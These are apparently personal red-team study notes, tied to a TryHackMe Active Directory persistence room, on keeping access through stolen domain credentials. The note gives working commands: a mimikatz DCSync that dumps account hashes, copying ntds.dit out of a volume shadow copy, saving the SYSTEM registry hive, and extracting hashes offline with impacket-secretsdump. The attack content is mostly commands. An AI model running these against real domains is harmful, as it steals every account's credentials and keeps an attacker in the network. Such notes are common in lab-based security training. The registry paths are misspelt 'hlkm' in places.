# AD Persistence With Credentials

This technique is the least reliable. Credential are:
- Domain restricted, but
	- Unless Account has `domain replication permissions`, which is required for [[AD-DC-Sync-Attack]]s
- Credential are rotated(changed) and can be by Blue Team, but
	- Near-privileged credentials for persistence is tactic of just enough to re-takeover, we need:
		- Credentials with Local Administrator Rights on as many machines as possible
		- Service Accounts that have delegation permissions for [[AD-Kerberos-Delegation-Exploitation]]
		- Accounts used for privileged AD services: WSUS, SCCM, etc   

## DCSync All

[[Mimikatz-Cheatsheet]]
```powershell
# mimikatz
lsadump::dcsync /domain:$domain /user:$user
# If want to dcsync every account mimikatz has builtin logging 
log dcdump.txt
```

Each domain controller runs a process called the Knowledge Consistency Checker (KCC). The KCC generates a replication topology for the AD forest and automatically connects to other domain controllers through Remote Procedure Calls (RPC) to synchronise information.

#### Shadow Copies

Volume Shadow Service (VSS) is a Microsoft backup technology that allows creation of snapshots of files or entire volumes use it copy `ntds.dit`, `hlkm\SYSTEM`, `hlkm\SAM` and `hlkm\SECURITY`. Exfiltration([[Data-Exfiltration-Defined]]) via some method is required.
```powershell
# Snapshot 
vshadow.exe -nw -p  C:
# And copy 
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
reg.exe save hklm\system c:\system.bak
# Exfiltrate back to Kali
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```

## References

[THM AD Persistence Room](https://tryhackme.com/room/persistingad)